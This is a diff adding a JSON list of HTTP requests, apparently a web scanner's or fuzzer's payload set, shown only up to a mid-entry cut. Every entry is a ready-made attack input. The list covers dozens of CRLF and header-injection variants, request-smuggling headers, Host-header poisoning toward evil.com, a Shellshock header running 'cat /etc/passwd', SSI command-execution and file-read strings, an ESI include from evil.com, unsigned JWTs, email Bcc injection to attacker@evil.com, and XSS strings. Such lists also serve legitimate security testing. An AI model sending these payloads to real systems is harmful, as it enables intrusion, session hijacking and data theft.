@@ -1,0 +1,6000 @@
+[
+  {
+    "method": "GET",
+    "url": "/%%0a0aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%%0a0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%%0a0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%0aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%0d%0aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%0dSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%0dSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%0dSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%23%0aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%23%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%23%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%23%0d%0aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%23%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%23%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%23%0dSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%23%0dSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%23%0dSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%25%30%61Set-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%25%30%61Set-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%25%30%61Set-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%25%30aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%25%30aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%25%30aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%250aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%250aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%250aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%25250aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%25250aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%25250aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%2F..%0d%0aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%2F..%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%2F..%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%3f%0d%0aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%3f%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%3f%0d%0aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%3f%0dSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%3f%0dSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%3f%0dSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/%u000aSet-Cookie:crlf=injection",
+    "params": {}
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com/%u000aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "next": "/%u000aSet-Cookie:crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "%0d%0aSet-Cookie:%20admin=true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "next": "%0d%0aSet-Cookie:%20admin=true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/login",
+    "params": {
+      "url": "%0d%0aLocation:%20http://evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/login",
+    "params": {
+      "next": "%0d%0aLocation:%20http://evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/goto",
+    "params": {
+      "url": "%0d%0a%0d%0a<html><body>Injected</body></html>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/goto",
+    "params": {
+      "next": "%0d%0a%0d%0a<html><body>Injected</body></html>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/callback",
+    "params": {
+      "url": "%0d%0aX-Injected:%20true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/callback",
+    "params": {
+      "next": "%0d%0aX-Injected:%20true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/return",
+    "params": {
+      "url": "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/return",
+    "params": {
+      "next": "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "/%0d%0aHost:%20evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "next": "/%0d%0aHost:%20evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/login",
+    "params": {
+      "url": "%E5%98%8A%E5%98%8DSet-Cookie:%20crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/login",
+    "params": {
+      "next": "%E5%98%8A%E5%98%8DSet-Cookie:%20crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/goto",
+    "params": {
+      "url": "%c4%8d%c4%8aSet-Cookie:%20crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/goto",
+    "params": {
+      "next": "%c4%8d%c4%8aSet-Cookie:%20crlf=injection"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/callback",
+    "params": {
+      "url": "\r\nSet-Cookie: admin=true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/callback",
+    "params": {
+      "next": "\r\nSet-Cookie: admin=true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/return",
+    "params": {
+      "url": "\r\nX-Forwarded-Host: evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/return",
+    "params": {
+      "next": "\r\nX-Forwarded-Host: evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "\r\n\r\n<script>alert(document.domain)</script>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "next": "\r\n\r\n<script>alert(document.domain)</script>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/login",
+    "params": {
+      "url": "%0aSet-Cookie:%20session=hijacked"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/login",
+    "params": {
+      "next": "%0aSet-Cookie:%20session=hijacked"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/goto",
+    "params": {
+      "url": "%0dSet-Cookie:%20stolen=true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/goto",
+    "params": {
+      "next": "%0dSet-Cookie:%20stolen=true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/callback",
+    "params": {
+      "url": "%00%0d%0aSet-Cookie:%20null=bypass"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/callback",
+    "params": {
+      "next": "%00%0d%0aSet-Cookie:%20null=bypass"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/return",
+    "params": {
+      "url": "%%0d0d%%0a0aSet-Cookie:%20double=encode"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/return",
+    "params": {
+      "next": "%%0d0d%%0a0aSet-Cookie:%20double=encode"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "params": {
+      "url": "http://example.com%0d%0aX-Injected: true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/login",
+    "params": {
+      "next": "/%0d%0aSet-Cookie: session=evil"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/goto",
+    "params": {
+      "dest": "/%0d%0aLocation: http://evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/return",
+    "params": {
+      "url": "http://x%0d%0a%0d%0a<script>alert(1)</script>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/forward",
+    "params": {
+      "to": "http://test.com%0D%0AX-Attack: true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/link",
+    "params": {
+      "url": "http://test.com\r\nX-Injected: header"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "params": {
+      "name": "test%0d%0a%0d%0a<html>Fake</html>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/view",
+    "params": {
+      "id": "1%0d%0a%0d%0a<script>alert(1)</script>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/nav",
+    "params": {
+      "url": "test%0d%0aLocation:%20http://evil.com%0d%0a%0d%0a"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/set",
+    "params": {
+      "value": "x%0d%0aSet-Cookie:%20admin=true%0d%0a%0d%0a"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/reset",
+    "headers": {
+      "Host": "evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/password",
+    "headers": {
+      "X-Forwarded-Host": "evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/secure",
+    "headers": {
+      "X-Forwarded-Proto": "http"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/admin",
+    "headers": {
+      "X-Original-URL": "/admin/delete"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/user",
+    "headers": {
+      "X-Rewrite-URL": "/admin"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/internal",
+    "headers": {
+      "X-Custom-IP-Authorization": "127.0.0.1"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/smuggle",
+    "headers": {
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/tunnel",
+    "headers": {
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "3"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/proxy",
+    "headers": {
+      "Transfer-Encoding": "chunked",
+      "Transfer-encoding": "identity"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/parse",
+    "headers": {
+      "Content-Length": "44"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/static/script.js",
+    "headers": {
+      "X-Forwarded-Host": "evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/account/settings.css",
+    "headers": {
+      "Accept": "text/css"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/resource",
+    "headers": {
+      "X-Forwarded-Scheme": "nothttps"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/profile",
+    "headers": {
+      "Origin": "https://evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/session",
+    "params": {
+      "token": "valid%0d%0aSet-Cookie: admin=true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/prefs",
+    "headers": {
+      "Cookie": "a=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/auth",
+    "params": {
+      "session": "x; Path=/; Domain=.evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/csrf",
+    "headers": {
+      "Cookie": "session=x; SameSite=None"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/private",
+    "headers": {
+      "Authorization": "Basic YWRtaW46YWRtaW4="
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/secure",
+    "headers": {
+      "Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/jwt",
+    "headers": {
+      "Authorization": "Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/windows",
+    "headers": {
+      "Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/cors",
+    "headers": {
+      "Origin": "https://evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/data",
+    "headers": {
+      "Origin": "null"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/cross",
+    "headers": {
+      "Origin": "https://attacker.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/sensitive",
+    "headers": {
+      "Origin": "https://evil.com",
+      "Access-Control-Request-Credentials": "true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/upload",
+    "headers": {
+      "Content-Type": "text/html"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/file",
+    "headers": {
+      "Content-Type": "application/octet-stream",
+      "X-Content-Type-Options": ""
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/text",
+    "headers": {
+      "Content-Type": "text/html; charset=UTF-7"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/form",
+    "headers": {
+      "Content-Type": "multipart/form-data; boundary=evil"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/resource",
+    "headers": {
+      "X-HTTP-Method-Override": "DELETE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/item",
+    "headers": {
+      "X-Method-Override": "PUT"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/debug",
+    "headers": {
+      "X-HTTP-Method-Override": "TRACE"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/tunnel",
+    "headers": {
+      "X-HTTP-Method-Override": "CONNECT"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/template",
+    "headers": {
+      "X-SSI-Inject": "<!--#include virtual=\"/etc/passwd\" -->"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/render",
+    "params": {
+      "name": "<!--#exec cmd=\"id\" -->"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/cache",
+    "headers": {
+      "Surrogate-Control": "<esi:include src=\"http://evil.com/\"/>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/log",
+    "headers": {
+      "User-Agent": "Mozilla\n[CRITICAL] Fake log entry"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/audit",
+    "headers": {
+      "User-Agent": "%n%n%n%n%n"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/access",
+    "headers": {
+      "Referer": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/contact",
+    "json": {
+      "email": "test@test.com%0d%0aBcc: attacker@evil.com"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/feedback",
+    "json": {
+      "subject": "Hello%0d%0aBcc: attacker@evil.com%0d%0a"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/notify",
+    "json": {
+      "to": "victim@test.com\r\nRCPT TO: attacker@evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/encode",
+    "params": {
+      "data": "testÄÄX-Injected: true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/decode",
+    "params": {
+      "url": "%250d%250aSet-Cookie:%20evil=true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/null",
+    "params": {
+      "param": "value%00%0d%0aX-Injected: true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/tab",
+    "params": {
+      "value": "test%09%0d%0aX-Injected: true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/oauth/callback",
+    "params": {
+      "redirect_uri": "http://app.com%0d%0aSet-Cookie:%20token=stolen"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/download",
+    "params": {
+      "file": "report.pdf%0d%0aContent-Disposition:%20attachment;filename=evil.exe"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/i18n",
+    "headers": {
+      "Accept-Language": "en%0d%0aX-Injected: true"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/data",
+    "headers": {
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "0"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/submit",
+    "headers": {
+      "Transfer-Encoding": "chunked",
+      "Transfer-encoding": "cow"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/upload",
+    "headers": {
+      "Transfer-Encoding": " chunked"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/form",
+    "headers": {
+      "Transfer-Encoding": "identity"
+    }
+  },
+  {
+    "method": "POST",
+    "url": "/api/process",
+    "headers": {
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "json": {
+      "a": "b"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/reset-password",
+    "headers": {
+      "Host": "evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/verify-email",
+    "headers": {
+      "Host": "attacker.com",
+      "X-Forwarded-Host": "evil.com"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/confirm",
+    "headers": {
+      "X-Forwarded-Host": "evil.com:8080"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/redirect",
+    "headers": {
+      "X-Original-URL": "/admin/delete-user"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "headers": {
+      "X-Rewrite-URL": "/admin/settings"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/home",
+    "headers": {
+      "User-Agent": "Mozilla/5.0\r\nX-Injected: true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/home",
+    "headers": {
+      "User-Agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/home",
+    "headers": {
+      "Referer": "http://evil.com\r\nSet-Cookie: admin=true"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/page",
+    "headers": {
+      "Referer": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "method": "GET",
+    "url": "/api/data",
